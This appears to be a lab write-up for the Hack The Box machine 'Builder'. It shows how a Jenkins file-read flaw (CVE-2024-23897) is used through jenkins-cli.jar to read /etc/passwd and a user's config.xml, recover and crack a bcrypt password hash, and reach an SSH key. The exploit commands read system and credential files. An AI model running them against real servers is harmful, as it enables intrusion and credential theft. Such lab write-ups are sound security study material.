+++
title = 'Builder'
description = 'Medium Linux'
hideMeta = true
+++

nmap scan
![Builder (Medium Linux).png](Builder%20%28Medium%20Linux%29.png)
port 8080
![Builder (Medium Linux)-1.png](Builder%20%28Medium%20Linux%29-1.png)
Jenkins is an open-source automation server used for continuous integration and continuous delivery (CI/CD) in software development. Automate tasks like building, testing and deploying software by integrating with various dev tools through its extensive plugin system.
Built with Java
![Builder (Medium Linux)-2.png](Builder%20%28Medium%20Linux%29-2.png)
Vulnerable to CVE-2024-23897 - Local File Inclusion - https://github.com/xaitax/CVE-2024-23897
![Builder (Medium Linux)-3.png](Builder%20%28Medium%20Linux%29-3.png)


Downloaded .jar file by going to http://10.129.230.220:8080/jnlpJars/jenkins-cli.jar

`java -jar jenkins-cli.jar -s http://10.129.230.220:8080/ connect-node "@/etc/passwd"`
![Builder (Medium Linux)-4.png](Builder%20%28Medium%20Linux%29-4.png)

On initial start in linux, username `admin` and password stored at /var/lib/jenkins/secrets/initialAdminPassword
![Builder (Medium Linux)-5.png](Builder%20%28Medium%20Linux%29-5.png)
![Builder (Medium Linux)-6.png](Builder%20%28Medium%20Linux%29-6.png)

Let's set up jenkins locally so we can play and look at the directory structure

```bash
sudo apt install -y docker.io
sudo docker pull jenkins/jenkins:lts-jdk17
sudo docker run -p 8000:8000 --restart=on-failure jenkins/jenkins:2.441-jdk17
```

![Builder (Medium Linux)-7.png](Builder%20%28Medium%20Linux%29-7.png)

We can see that there is a file called users.xml which contains information about the directory of the users - and then these directories contain a config.xml which contain a password hash

![Builder (Medium Linux)-8.png](Builder%20%28Medium%20Linux%29-8.png)
`java -jar jenkins-cli.jar -s http://10.129.230.220:8080/ connect-node "@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml"`
![Builder (Medium Linux)-9.png](Builder%20%28Medium%20Linux%29-9.png)

`$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a`

![Builder (Medium Linux)-10.png](Builder%20%28Medium%20Linux%29-10.png)

`jennifer` :`princess` - oujo 

Logged in to Jenkins!

![Builder (Medium Linux)-11.png](Builder%20%28Medium%20Linux%29-11.png)

![Builder (Medium Linux)-12.png](Builder%20%28Medium%20Linux%29-12.png)
![Builder (Medium Linux)-13.png](Builder%20%28Medium%20Linux%29-13.png)

Another file that wasn't there compared to normal install

![Builder (Medium Linux)-14.png](Builder%20%28Medium%20Linux%29-14.png)

SSH private key?

Make the following pipeline
![Builder (Medium Linux)-15.png](Builder%20%28Medium%20Linux%29-15.png)

![Builder (Medium Linux)-16.png](Builder%20%28Medium%20Linux%29-16.png)

Got private key

![Builder (Medium Linux)-17.png](Builder%20%28Medium%20Linux%29-17.png)
![Builder (Medium Linux)-18.png](Builder%20%28Medium%20Linux%29-18.png)


